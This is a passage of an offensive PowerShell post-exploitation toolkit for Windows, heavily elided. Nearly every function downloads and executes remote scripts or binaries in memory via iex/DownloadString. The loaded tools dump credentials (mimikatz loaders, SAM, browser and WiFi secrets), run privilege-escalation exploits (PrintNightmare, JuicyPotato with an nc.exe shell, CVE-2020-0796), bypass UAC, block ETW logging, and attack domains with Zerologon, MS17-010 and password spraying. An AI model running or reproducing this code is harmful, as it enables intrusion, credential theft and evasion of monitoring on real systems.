...
'@
        if ($noninteractive)
        {
            ...
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
            ...
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
            if(!$consoleoutput){
            ...
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
            if(!$consoleoutput){
            ...
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
            if(!$consoleoutput){
            ...
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
            if (isadmin)
            {
            ...
            if (isadmin)
            {
                ...
                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
                if(!$consoleoutput){
    ...
    if ($web)
    {
    	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/RaouzRouik/Creds/raw/master/pwned_x64/notepad.exe'
...
<#
    ...
    if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
    {
        ...
        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/RaouzRouik/WinPwn/master/WinPwn.ps1'');WinPwn;}'
        ...
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/Invoke-InveighRelay.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/Invoke-SMBClient.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/Invoke-SMBEnum.ps1")
        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/Invoke-SMBExec.ps1")
...
function adidns
{
    ...
    IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Powermad.ps1")
    if ($addwildcard)
    {
...
function SessionGopher 
{
    ...
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/segoph.ps1')
    $whole_domain = "no"
...
function Kittielocal 
{
    ...
    if ($noninteractive)
    {
        ...
        {
            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/DumpWCM.ps1')
...
'@
		...
		Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
            ...
            Switch ($masterquestion) 
            {
                1{iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
...
function Decryptteamviewer
{
 param(
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
    if(!$consoleoutput){
...
function SharpCloud
{
 param(
    ...
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpCloud.ps1')
    if(!$consoleoutput){
...
function Safedump
{
 param(
    ...
    blocketw
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
    Invoke-Sharpcradle -uri https://github.com/RaouzRouik/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
}
...
function Obfuskittiedump
{
 param(
    ...
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/mimi.ps1')
...
function Wificreds
{
 param(
    ...
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
...
function Kittenz
{
 param(
    ...
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/obfuskittie.ps1')
...
function Samfile
{
 param(
    ...
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
...
<#
    ...
    if (isadmin)
    {
		...
		Write-Host "Something went wrong, using safetykatz instead"
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/SafetyDump.ps1')
                 if(!$consoleoutput){
...
function PrintNightmare
{
    ...
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-PrintNightmare.ps1')
    Invoke-Nightmare -DriverName $DriverName
}

function cve-2020-0796
{
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/cve-2020-0796-lpe.ps1')
    cve-2020-0796-lpe
}

function cve-2020-0787-lpe
{
	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/cve-2020-0787.ps1')
	cve-2020-0787
}

function printspoofer
{
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/printspoof_interactive.ps1')
    printspoof
}
...
function CVE-2020-0683-lpe
{
    ...
    {
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/cve-2020-0683.ps1')
    	CVE-2020-0683
    }
    else
    {
...
function CVE-2019-1215
{
    ...
    Invoke-Webrequest -Uri "https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
    if ([Environment]::Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/cve-2019-1215.ps1')
    }
    else
    {
        Write-Host "Only x64, Sorry"
...
function ms15-077
{
    ...
    {
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/m15-077.ps1')
...
function Juicypot
{
    ...
    if ([Environment]::Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/juicypotato64.ps1')
        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
    }
    else
    {
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/invoke-juicypotato.ps1')
        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
    }
    Start-Sleep -Seconds 3
    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
...
function CVE-2018-8120
{
    ...
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-Webrequest -Uri "https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/cve-2018-8120.ps1')
...
function CVE-2019-0841
{
    ...
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-Webrequest -Uri "https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
    Invoke-Sharpcradle -uri "https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
    Start-Sleep -Seconds 3
...
{
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
    Invoke-Sharpcradle -uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
...
function CVE-2019-1069
{
	blocketw
	    ...
	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
	    {
		    ...
		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
		    Invoke-Webrequest -Uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
		    Invoke-Webrequest -Uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
		    Invoke-Webrequest -Uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
		
		    if ([Environment]::Is64BitProcess)
		    {
			    Invoke-Sharpcradle -uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
			    Start-Sleep -Seconds 1.5
			    Invoke-Sharpcradle -uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
		    }
		    else
		    {
			    Invoke-Sharpcradle -uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
			    Start-Sleep -Seconds 1.5
			    Invoke-Sharpcradle -uri https://github.com/RaouzRouik/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
		    }
...
function ms16-32
{
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/ms16-32.ps1')
    Invoke-MS16-032
}

function ms16-135
{
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/ms16-135.ps1')
}
...
function Generalrecon{
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
...
@{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release
	...
	Function Get-FireWallRule
	 ...
	 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
...
$noninteractive   
    ...
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-EventLogparser.ps1')
	if(!$consoleoutput){
...
$noninteractive   
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Get-DotNetServices.ps1')
...
$noninteractive   
    ...
    if (isadmin)
    {
        ...
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
...
function Sensitivefiles{
    ...
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/find-interesting.ps1')
    if(!$consoleoutput){
...
function Browserpwn{
   ...
   [Switch]
    ...
    if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
    {
        ...
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
        try
        {
    ...
    if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
    {
        ...
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
...
'@
	...
	Write-Host -ForegroundColor Green '5. Pop System Shell using Token Manipulation!'
        ...
        Switch ($masterquestion) 
        {
             1{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
             2{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}
             3{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}
             4{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}
	     5{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}
       }
    }
...
'@
    if($noninteractive)
    {
        ...
        {
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/uaccmstp.ps1')
            uaccmstp -BinFile $command
        }
        elseif($technique -eq "magic")
        {
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/uacmagic.ps1')
            uacmagic -BinPath $command
        }
        elseif ($technique -eq "DiskCleanup")
        {
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/diskcleanupuac.ps1')
    ...
    do
    {
        ...
        Switch ($masterquestion) 
        {
             1{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/uacmagic.ps1'); uacmagic -BinPath $command}
             2{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/uaccmstp.ps1');uaccmstp -BinFile $command}
             3{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/diskcleanupuac.ps1');DiskCleanupBypass -command $command}
             4{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/dccuac.ps1')}
       }
    }
 While ($masterquestion -ne 5)
...
<#
    ...
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
        ...
        if ($domain)
        {
            ...
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/viewobfs.ps1')
	    ...
	    {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                Invoke-WebRequest -Uri 'https://github.com/RaouzRouik/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
            }
...
g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
        ...
        {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            if (!(test-path $currentPath\passhunt.exe)){Invoke-WebRequest -Uri 'https://github.com/RaouzRouik/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe}
...
function Searchservers
{
    ...
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/viewdevobfs.ps1')
...
function generaldomaininfo{
    ...
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/view.ps1')
    $domain_Name = skulked
...
if(!$consoleoutput){	
	...
	IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/SPN-Scan.ps1')
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/adpass.ps1')
...
function Snaffler
{
    ...
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Snaffler.ps1')
    if (!$noninteractive)
    {
...
function oxidresolver
{
    ...
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-OxidResolver.ps1')
    if(!$consoleoutput){pathcheck}
...
function Spoolvulnscan
{
    ...
    {   
        ...
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/SpoolerScanner/master/SpoolerScan.ps1')
    ...
    if ($answer -eq "yes" -or $answer -eq "y" -or $answer -eq "Yes" -or $answer -eq "Y")
    {
              ...
              IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Spoolsample.ps1')
              if(!$consoleoutput)
              {
...
function GPORemoteAccessPolicy
{
    ...
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpGPO-RemoteAccessPolicies.ps1')
...
function RBCD-Check
{
    ...
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Get-RBCD-Threaded.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
...
function Printercheck
{
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpPrinter.ps1')
...
<#
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Grouper2.ps1')
...
function reconAD
{
    ...
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
...
<#
    ...
    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/bluekeepscan.ps1')
    IEX ($viewdevobfs)
    $serversystems = "yes"
...
<#
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-Zerologon.ps1')
    $domcontrols = spinster
...
<#
    ...
    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/ms17-10.ps1')
    IEX ($viewdevobfs)
    $serversystems = "yes"
    if(!$noninteractive)
    {
...
<#
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/PowerUpSQL.ps1')
...
<#
    ...
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharphound3.ps1')
...
function oldchecks
{
    ...
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/locksher.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/UpPower.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/GPpass.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/AutoGP.ps1')
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/DumpWCM.ps1')
    if(!$consoleoutput){
...
function itm4nprivesc
{
    ...
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
    if(!$consoleoutput)
    {
...
function winPEAS
{
    ...
    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}
    if ($noninteractive)
    {
        IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1')
...
function Reg1c1de
{
	IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-Reg1c1de.ps1')
	Invoke-Reg1c1de
}
...
function laZagnemodule
{
    ...
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri 'https://github.com/RaouzRouik/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
...
function Domainpassspray
{
    ...
    if ($emptypasswords)
    {
    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1')
...
function launcher
{
    ...
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/wmicmd.ps1')
...
function inv-phantom {
    if (isadmin)
    {
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/phantom.ps1')
        phantom
    }
    else 
    { 
...
function fruit
{
    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
}

function Mimiload
{
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/loadmimi.ps1')
	mimiload
}

function BlockEtw
{
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/Invoke-BlockETW.ps1')
	Invoke-BlockETW
}
...
$Certify = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')
$SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')
$viewdevobfs = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RaouzRouik/Creds/master/obfuscatedps/viewdevobfs.ps1')
$admodule = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/RaouzRouik/Creds/master/PowershellScripts/ADModuleImport.ps1')
